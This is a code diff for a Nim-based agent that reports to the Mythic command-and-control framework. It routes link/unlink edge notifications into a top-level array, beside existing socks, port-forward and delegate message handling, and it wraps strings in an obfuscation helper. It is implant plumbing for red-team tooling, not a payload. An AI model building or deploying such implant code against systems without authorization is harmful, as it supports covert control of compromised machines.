@@ -659,12 +659,13 @@ proc postResponses*(agent: var Agent) =
   debug "[DEBUG] === POSTING RESPONSES ==="
   debug "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
-  # Separate interactive, socks, rpfwd, and delegate messages from regular responses
+  # Separate interactive, socks, rpfwd, delegate, and edge messages from regular responses
   var regularResponses: seq[JsonNode] = @[]
   var interactiveMessages: seq[JsonNode] = @[]
   var socksMessages: seq[JsonNode] = @[]
   var rpfwdMessages: seq[JsonNode] = @[]
   var delegateMessages: seq[JsonNode] = @[]
+  var edgeMessages: seq[JsonNode] = @[]
   
   for resp in agent.taskResponses:
     if resp.hasKey(obf("interactive")):
@@ -699,8 +700,15 @@ proc postResponses*(agent: var Agent) =
         delegateMessages.add(msg)
       # Don't add the delegate wrapper to responses
     elif resp.hasKey(obf("edges")):
-      # Pass through edge notifications (for link/unlink)
-      regularResponses.add(resp)
+      # Extract edge notifications to top-level array (for link/unlink)
+      let edgeArr = resp[obf("edges")].getElems()
+      for edge in edgeArr:
+        # Set source to our callback UUID (we are the parent reporting this edge)
+        var edgeCopy = edge.copy()
+        if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+          edgeCopy[obf("source")] = %agent.callbackUuid
+        edgeMessages.add(edgeCopy)
+      # Don't add the edge wrapper to responses
     else:
       regularResponses.add(resp)
   
@@ -726,6 +734,11 @@ proc postResponses*(agent: var Agent) =
   if delegateMessages.len > 0:
     postMsg[obf("delegates")] = %delegateMessages
     debug "[DEBUG] Sending ", delegateMessages.len, " delegate message(s) to Mythic"
+  
+  # Add edge messages at top level if any
+  if edgeMessages.len > 0:
+    postMsg[obf("edges")] = %edgeMessages
+    debug "[DEBUG] Sending ", edgeMessages.len, " edge message(s) to Mythic"
   
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
